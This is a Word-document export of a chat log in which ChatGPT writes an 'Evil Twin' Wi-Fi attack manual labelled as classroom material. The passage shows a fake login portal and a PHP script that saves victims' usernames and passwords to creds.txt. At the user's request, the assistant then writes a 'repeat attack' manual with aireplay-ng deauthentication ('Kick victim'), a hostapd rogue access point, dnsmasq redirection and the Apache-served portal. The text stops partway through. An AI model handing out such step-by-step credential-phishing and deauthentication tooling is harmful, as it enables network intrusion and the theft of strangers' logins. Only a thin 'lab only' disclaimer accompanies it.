        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;input type="text" name="username" placeholder="Username" required&gt;&lt;br&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C09693">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;input type="password" name="password" placeholder="Password" required&gt;&lt;br&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D3C358">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;button type="submit"&gt;Login&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C49F2C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4FFBEC6E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1BD1A771">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023A733B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB0D53B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="711B50C8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>5.3 Capture Credentials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6FCBB9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AEA5A41">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Create /var/www/html/login.php:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBD3CA9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44BC08BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79ED75D3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>file_put_contents("creds.txt", "User: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDFB584">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>echo "&lt;h1&gt;Thanks! Connecting...&lt;/h1&gt;&lt;p&gt;Please wait while internet access is granted.&lt;/p&gt;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F706605">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4285DF36">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BACF856">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30029EBD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Now credentials will be stored in /var/www/html/creds.txt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A449C3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52C324CC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📱 Step 6: Victim’s Experience</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76007F06">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="709C5D4B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Victim’s device gets disconnected (due to deauth).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65EDD466">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55ED0F71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Sees your fake Wi-Fi with same name (SSID).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582FA4A9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01F3F79A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Connects to it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A80232">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B2F3A2E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Any webpage they open redirects to your fake login portal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADF54BF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="532F314C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>If they enter details → saved in creds.txt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0355A3C3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69F29BB0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🧹 Step 7: Cleanup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209A92C4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41418FEC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>After demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AF2E8F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BE0D760">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl stop apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D59F12">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill dnsmasq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E29EB63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill hostapd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF70F84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo airmon-ng stop wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3735AB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl restart NetworkManager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F511BFE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A66385C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>✅ What Students Learn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538A5CBD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27AC4E66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>How deauthentication forces victims to disconnect.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECD78CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E372D00">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>How attackers clone SSIDs to trick users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B336FA2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AC0E71B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>How DNS redirection forces all traffic to attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609BACF0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74F7B6C1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Why using untrusted Wi-Fi is risky.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6870831B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F283780">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>👉 Do you want me to also include a defense section (how victims can detect &amp; protect themselves from Evil Twin) so students understand prevention, not just attack?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DC2F82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38BBEA48">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>You said:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5003F4BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>i see that this is the manual to perform the 1st time....give manual to repeat the attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2368395A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>ChatGPT said:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D1F36A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="387C5BFD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Got it ✅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7947B4F8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>The previous manual was first-time setup (installing tools, configuring hostapd, dnsmasq, Apache, making fake portal etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202F92C0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="395BE6D6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Now I’ll give you a Repeat Attack Manual — meaning:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C01D17">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="288B86EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Next time, you don’t have to redo all configs, just restart services in the right order.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B440F5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E4F8940">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📖 Classroom Manual: Repeating the Evil Twin Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5252E523">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01820EBF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>⚠️ Reminder to Students: Only run this in lab. This is for educational defense training.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714F8590">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56A90626">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🛠️ Pre-Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374D2129">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3744562E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Ensure ALFA adapter is plugged in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322026E9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6590AEEB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Ensure hostapd.conf, dnsmasq.conf, and fake portal (index.html, login.php) are still saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3BD93A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D9B3444">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Clear old processes (important before restarting attack):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064DEEC9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B39DFD1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill hostapd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585692DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill dnsmasq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBDDF61">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl stop apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD03FDE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl restart NetworkManager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEC92F2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1799532B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🚀 Step 1: Put Adapter in Monitor Mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777868EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ip link set wlan0 down</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055D7C9A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo iw dev wlan0 set type monitor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC4FD74">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ip link set wlan0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327B69F5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DFFE0DB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📡 Step 2: (Optional) Deauth Victim from Legit Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B083660">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="229D5026">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Find BSSID &amp; channel again if needed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48862B2F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DC1C094">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo airodump-ng wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348D45CF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C498D5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00AC5A89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Kick victim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F83711">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="018AB7AC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo aireplay-ng --deauth 10 -a &lt;BSSID&gt; wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626C4B09">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4766A54F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🛰️ Step 3: Launch Fake AP (hostapd)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76601E3E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo hostapd /etc/hostapd/hostapd.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589B665D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D77FFCC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67FD92B9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>(This will run until you stop it. In new terminal, do next steps.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348E9512">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CE4CB5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🌐 Step 4: Launch DHCP + DNS (dnsmasq)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE5BDAA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28F1078E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Assign IP to attacker AP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE0D8C9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EA209FE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo ifconfig wlan0 192.168.10.1/24 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FE5216">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C7A2B43">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C8538A7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Start dnsmasq:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6113E6A4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DC71E95">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo dnsmasq -C /etc/dnsmasq.conf -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23779805">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C4D35F1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🖥️ Step 5: Serve the Fake Portal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B12DC0B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="676E6899">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Start Apache:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8E585F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56297415">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
